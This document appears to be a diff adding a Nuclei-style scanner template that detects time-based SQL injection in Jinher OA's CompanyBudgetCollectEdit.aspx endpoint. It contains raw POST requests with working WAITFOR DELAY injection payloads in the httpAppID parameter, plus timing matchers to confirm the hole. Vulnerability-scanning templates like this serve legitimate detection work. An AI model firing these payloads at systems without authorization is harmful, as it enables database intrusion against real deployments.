@@ -1,0 +1,49 @@
+id: poc-yaml-jinher-jhsoft-companybudgetcollectedit-aspx-sqli
+info:
+  name: "金和OA CompanyBudgetCollectEdit.aspx SQL 注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 金和OA
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "JHSoft"
+        part: body
+
+  - raw:
+      - |
+        POST /c6/JHSoft.Web.CostControl/Collect/CompanyBudgetCollectEdit.aspx/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        httpAppID=1'waitfor+delay%270:0:5%27--&httpOID=1
+      - |
+        POST /c6/JHSoft.Web.CostControl/Collect/CompanyBudgetCollectEdit.aspx/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        httpAppID=1'waitfor+delay%270:0:8%27--&httpOID=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "SessionId="
+        part: header
+      - type: dsl
+        dsl:
+          - "len(body) == 0"
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
